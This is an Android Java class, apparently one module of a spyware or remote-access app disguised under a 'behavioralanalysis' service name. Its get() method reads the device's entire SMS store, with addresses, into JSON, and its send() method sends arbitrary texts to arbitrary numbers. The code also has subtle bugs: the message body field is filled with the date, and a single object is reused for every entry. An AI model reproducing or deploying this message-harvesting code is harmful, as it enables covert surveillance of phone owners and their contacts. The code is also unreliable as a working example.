package com.behavioralanalysis.service;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class Sms {
    public static JSONObject get() {
        JSONObject result = new JSONObject();
        JSONArray array = new JSONArray();
        try {
            Uri uri = Uri.parse("content://sms/");
            Context context = MainService.getContext();
            Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);
            JSONObject sms = new JSONObject();
            while (cursor.moveToNext()) {
                sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("date")).toString());
                sms.put("read", cursor.getString(cursor.getColumnIndexOrThrow("read")).toString());
                String type = cursor.getString(cursor.getColumnIndexOrThrow("type")).toString();
                sms.put("type", type);
                if (type.equals("3")) {
                    Cursor c = context.getContentResolver().query(
                            Uri.parse("content://mms-sms/conversations?simple=true"),
                            null,
                            "_id =" + cursor.getString(cursor.getColumnIndexOrThrow("thread_id")).toString(),
                            null,
                            null
                    );
                    if (c.moveToFirst()) {
                        sms.put("address", c.getString(c.getColumnIndexOrThrow("address")).toString());
                        c.close();
                    }
                } else {
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")).toString());
                }
                array.put(sms);
            }
            cursor.close();

            result.put("sms", array);
        } catch (IllegalArgumentException ex) {
            ex.printStackTrace();
        } catch (JSONException ex) {
            ex.printStackTrace();
        }

        return result;
    }

    public static boolean send(String phone, String msg) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phone, null, msg, null, null);
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }
    }
}
